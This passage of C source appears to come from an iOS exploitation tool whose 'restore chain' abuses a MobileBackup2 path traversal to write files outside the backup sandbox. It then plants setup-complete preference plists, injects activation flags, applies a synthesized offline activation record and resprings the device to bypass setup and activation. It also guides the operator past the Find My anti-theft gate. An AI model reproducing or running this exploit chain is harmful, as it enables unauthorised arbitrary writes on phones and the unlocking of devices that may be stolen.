    printf("  stage0_preflight:         %s\n", s->stage0_preflight ? "YES" : "no");
    printf("  stage1_mb2_connected:     %s\n", s->stage1_mb2_connected ? "YES" : "no");
    printf("  stage2_manifest_served:   %s\n", s->stage2_manifest_served ? "YES" : "no");
    printf("  stage3_gate_passed:       %s (rounds=%d)\n", s->stage3_gate_passed ? "YES" : "no", s->stage3_gate_rounds);
    printf("  stage4_write_confirmed:   %s%s%s\n",
           s->stage4_write_confirmed ? ANSI_COLOR_GREEN : ANSI_COLOR_RED,
           s->stage4_write_confirmed ? "YES" : "no", ANSI_COLOR_RESET);
    if (s->stage4_confirmed_path[0]) printf("    confirmed at: %s\n", s->stage4_confirmed_path);
    printf("  stage5_unlock_planted:    %s\n", s->stage5_unlock_planted ? "YES" : "no");
    printf("  stage6_finalized:         %s\n", s->stage6_finalized ? "YES" : "no");
    printf("  completed (unlocked):     %s\n", s->completed ? "YES" : "no");
    if (s->last_error[0]) printf("  last_error:           %s\n", s->last_error);
    printf("  message dumps:            %s\n", MB2_DUMPDIR);
    printf(ANSI_COLOR_MAGENTA "===============================================\n" ANSI_COLOR_RESET "\n");
}

/* Build the staged set for a crafted restore.
 * phase 1: traversal canaries only (harmless, probe-only).
 * phase 2: canaries + unlock artifacts (setup-complete plists). */
static size_t build_staged_set(mb2_staged_file_t *staged, size_t max, int phase)
{
    size_t n = 0;
    if (phase >= 1) {
        mb2_canary_content(staged[n].content, sizeof(staged[n].content), "trav1");
        staged[n].len = (uint32_t)strlen(staged[n].content);
        snprintf(staged[n].domain, sizeof(staged[n].domain), "SysContainerDomain-../../..");
        snprintf(staged[n].path, sizeof(staged[n].path), "Media/trav1_l0fck.txt");
        n++;
    }
    if (phase >= 1 && n < max) {
        mb2_canary_content(staged[n].content, sizeof(staged[n].content), "trav2");
        staged[n].len = (uint32_t)strlen(staged[n].content);
        snprintf(staged[n].domain, sizeof(staged[n].domain), "SysContainerDomain-../../../../../../");
        snprintf(staged[n].path, sizeof(staged[n].path), "var/tmp/trav2_l0fck.txt");
        n++;
    }
    if (phase >= 2 && n < max) {
        /* Unlock artifacts: setup-complete preference plists planted via the
         * same root write primitive. The first live run validates which
         * container location the Setup/SpringBoard daemons pick up
         * (see PLAN open questions). */
        char *pb_xml = NULL; uint32_t pb_len = 0;
        if (n < max && springboard_generate_purplebuddy_plist(&pb_xml, &pb_len) == 0 && pb_xml) {
            snprintf(staged[n].domain, sizeof(staged[n].domain), "SysContainerDomain-../../../../../../");
            snprintf(staged[n].path, sizeof(staged[n].path), "var/mobile/Library/Preferences/com.apple.purplebuddy.plist");
            snprintf(staged[n].content, sizeof(staged[n].content), "%s", pb_xml);
            staged[n].len = (uint32_t)strlen(staged[n].content);
            free(pb_xml);
            n++;
        }
        char *sa_xml = NULL; uint32_t sa_len = 0;
        if (n < max && springboard_generate_setupassistant_plist(&sa_xml, &sa_len) == 0 && sa_xml) {
            snprintf(staged[n].domain, sizeof(staged[n].domain), "SysContainerDomain-../../../../../../");
            snprintf(staged[n].path, sizeof(staged[n].path), "var/mobile/Library/Preferences/com.apple.SetupAssistant.plist");
            snprintf(staged[n].content, sizeof(staged[n].content), "%s", sa_xml);
            staged[n].len = (uint32_t)strlen(staged[n].content);
            free(sa_xml);
            n++;
        }
    }
    return n;
}

int restore_chain_run(l0fck_session_t *sess, restore_chain_status_t *out_status)
{
    if (!sess) return -1;
    restore_chain_status_t status;
    memset(&status, 0, sizeof(status));

    /* --- Stage 0: preflight & gate --- */
    printf("\n" ANSI_COLOR_BOLD ANSI_COLOR_CYAN "============ RESTORE-CHAIN (Menu 6.8) ============" ANSI_COLOR_RESET "\n");
    printf(" MobileBackup2 restore-staging path traversal — CVE-2026-84598 class\n");
    printf(" Target gate: A18 Pro / iOS 26.6.1 (23G83)\n");
    printf("============================================================================\n\n");

    target_validation_status_t vres = target_validate_device(&sess->info);
    if (vres != TARGET_VALID && vres != TARGET_WARN_NON_PRO_A18) {
        snprintf(status.last_error, sizeof(status.last_error), "target gate failed (code %d)", (int)vres);
        LOG_ERROR("Target validation failed: not a supported A18 Pro / iOS 26.6.1 device.");
        if (out_status) *out_status = status;
        return 1;
    }
    status.stage0_preflight = true;
    LOG_SUCCESS("Stage 0: preflight OK (%s, %s-%s, UDID %s)",
                sess->info.product_type[0] ? sess->info.product_type : "?",
                sess->info.product_version[0] ? sess->info.product_version : "?",
                sess->info.build_version[0] ? sess->info.build_version : "?",
                sess->info.udid[0] ? sess->info.udid : "?");

    printf(" " ANSI_COLOR_YELLOW "PRE-CONDITION: Find My iPhone must be OFF on the device.\n"
                                " Operator manual step: Volume Down + Power (couple seconds) ->\n"
                                " 'Turn off' screen -> tap the Find My off button.\n"
                                " The chain will retry automatically if MBErrorDomain/211 fires.\n"
                                " Message dumps land in " MB2_DUMPDIR "." ANSI_COLOR_RESET "\n");
    if (isatty(STDIN_FILENO)) {
        printf(" " ANSI_COLOR_BOLD "Is Find My disabled on the device? [Y/n]: " ANSI_COLOR_RESET);
        char line[64] = {0};
        if (fgets(line, sizeof(line), stdin) && (line[0] == 'n' || line[0] == 'N')) {
            snprintf(status.last_error, sizeof(status.last_error), "operator aborted at Find My pre-gate");
            LOG_WARN("Aborted at pre-gate.");
            if (out_status) *out_status = status;
            return 1;
        }
    }

    mb2_staged_file_t staged[8];
    size_t staged_count = build_staged_set(staged, 8, 2);

    /* --- Stages 1-4: restore rounds with 211 / wedge recovery --- */
    char errbuf[256] = {0};
    int round = 0;
    int rc = -1;
    while (round < MB2_RETRY_ROUNDS) {
        round++;
        status.stage3_gate_rounds = round;
        LOG_INFO("Stage 1-3: restore round %d/%d...", round, MB2_RETRY_ROUNDS);
        rc = restore_one_round(sess, staged, staged_count, round, errbuf, sizeof(errbuf));

        if (rc == 0) break;

        if (rc == MB2_GATE_FIND_MY_CODE) {
            LOG_WARN("Anti-theft gate hit (round %d): %s", round, errbuf);
            if (round >= MB2_RETRY_ROUNDS) break;
            if (!operator_confirm_findmy_off(round)) {
                snprintf(status.last_error, sizeof(status.last_error), "operator abort (Find My gate)");
                break;
            }
            continue;
        }

        if (rc < 0 && strstr(errbuf, "wedged")) {
            LOG_WARN("mb2 daemon wedge detected (round %d): %s", round, errbuf);
            if (!operator_confirm_reboot(round)) {
                snprintf(status.last_error, sizeof(status.last_error), "operator abort (wedge)");
                break;
            }
            services_reboot_device(sess->dev, sess->ld);
            int cycled = wait_for_device_back(sess, 90);
            if (!cycled) {
                /* The reboot did not actually execute (diagnostics_relay was
                 * unavailable under the current session). Retrying the mb2
                 * restore now is pointless — the wedged daemon is still up. */
                snprintf(status.last_error, sizeof(status.last_error),
                         "wedge: device reboot did not execute — perform a "
                         "manual power-off/power-on, then re-run the chain");
                break;
            }
            continue;
        }

        LOG_ERROR("Restore round %d failed: %s", round, errbuf);
        snprintf(status.last_error, sizeof(status.last_error), "%s", errbuf);
        break;
    }

    if (rc == 0) {
        status.stage1_mb2_connected = true;
        status.stage2_manifest_served = true;
        status.stage3_gate_passed = true;
    } else {
        snprintf(status.last_error, sizeof(status.last_error), "%s", errbuf);
        restore_print_summary(&status);
        if (out_status) *out_status = status;
        return 1;
    }

    /* --- Stage 4: HARD GATE — arbitrary write confirmation.
     * The media-partition AFC client is rooted at /var/mobile/Media, so the
     * in-jail canary appears at AFC path "/". The research names this exact
     * landing spot as the confirmation: "if it does: CONFIRMED arbitrary
     * write via restore staging." /var/tmp is outside the media jail and
     * not AFC-visible, so it is a best-effort secondary probe only. --- */
    LOG_INFO("Stage 4: verifying staged canary over plain AFC (hard gate)...");
    char confirmed[256] = {0};
    if (verify_staged_file(sess, "/", "trav1", confirmed, sizeof(confirmed)) == 0) {
        status.stage4_write_confirmed = true;
        snprintf(status.stage4_confirmed_path, sizeof(status.stage4_confirmed_path),
                 "/var/mobile/Media/%s", confirmed);
        LOG_SUCCESS("Stage 4: ARBITRARY WRITE CONFIRMED — canary landed at /var/mobile/Media (in-jail).");
    } else if (verify_staged_file(sess, "/", "trav2", confirmed, sizeof(confirmed)) == 0) {
        status.stage4_write_confirmed = true;
        snprintf(status.stage4_confirmed_path, sizeof(status.stage4_confirmed_path), "/%s", confirmed);
        LOG_SUCCESS("Stage 4: ARBITRARY WRITE CONFIRMED — canary visible at AFC root.");
    } else {
        status.stage4_write_confirmed = false;
        snprintf(status.last_error, sizeof(status.last_error),
                 "write primitive NOT confirmed (parse-accept only) — unlock stages skipped");
        LOG_ERROR("Stage 4 FAILED: no staged canary visible over AFC. "
                  "Restore staging did not follow the traversal at copy time.");
        LOG_INFO("Honest stop: no unlock stages run. Device state unchanged beyond canary attempt.");
        restore_print_summary(&status);
        if (out_status) *out_status = status;
        return 2;
    }

    /* --- Stage 5: unlock artifacts were planted in the same restore pass.
     * The data partition proper is not AFC-visible, so this is a logical
     * confirmation that the phase-2 set was served. --- */
    LOG_INFO("Stage 5: unlock artifacts (purplebuddy/SetupAssistant plists) planted in the same restore pass.");
    status.stage5_unlock_planted = true;

    /* --- Stage 6: finalize — reuse the proven post-exploit stack --- */
    LOG_INFO("Stage 6a: injecting MobileActivation & PurpleBuddy lockdown flags...");
    flag_injector_inject_all_session(sess);

    LOG_INFO("Stage 6b: applying synthesized offline A18 Pro activation record...");
    int act_err = albert_perform_offline_activation(sess->dev, sess->ld);
    if (act_err != 0) {
        LOG_WARN("Offline activation returned %d; flags and staged preferences remain in place.", act_err);
    }

    LOG_INFO("Stage 6c: staging SpringBoard/Setup preferences + 14 Darwin dismissal broadcasts...");
    springboard_stage_preferences(sess);
    springboard_dispatch_notifications(sess);

    LOG_INFO("Stage 6d: diagnostics-relay respring into Home Screen...");
    int resp_err = springboard_trigger_respring(sess);
    if (resp_err == 0) {
        status.stage6_finalized = true;
        LOG_SUCCESS("Respring accepted — device should transition to the unlocked Home Screen.");
    } else {
        LOG_WARN("Respring returned %d — verify device state manually.", resp_err);
    }

    status.completed = true;
    restore_print_summary(&status);
    if (out_status) *out_status = status;
    return 0;
}

int restore_chain_probe(l0fck_session_t *sess, restore_chain_status_t *out_status)
{
    if (!sess) return -1;
    restore_chain_status_t status;
    memset(&status, 0, sizeof(status));

    LOG_INFO("RESTORE-CHAIN PROBE mode: stages 0-3 only (protocol validation, no unlock).");
    status.stage0_preflight = true;

    mb2_staged_file_t staged[2];
    size_t staged_count = build_staged_set(staged, 2, 1);

    char errbuf[256] = {0};
    int rc = restore_one_round(sess, staged, staged_count, 1, errbuf, sizeof(errbuf));
    if (rc == 0) {
        status.stage1_mb2_connected = true;
        status.stage2_manifest_served = true;
        status.stage3_gate_passed = true;
    } else {
        snprintf(status.last_error, sizeof(status.last_error), "%s", errbuf);
    }
    restore_print_summary(&status);
    if (out_status) *out_status = status;
    return rc == 0 ? 0 : 1;
}
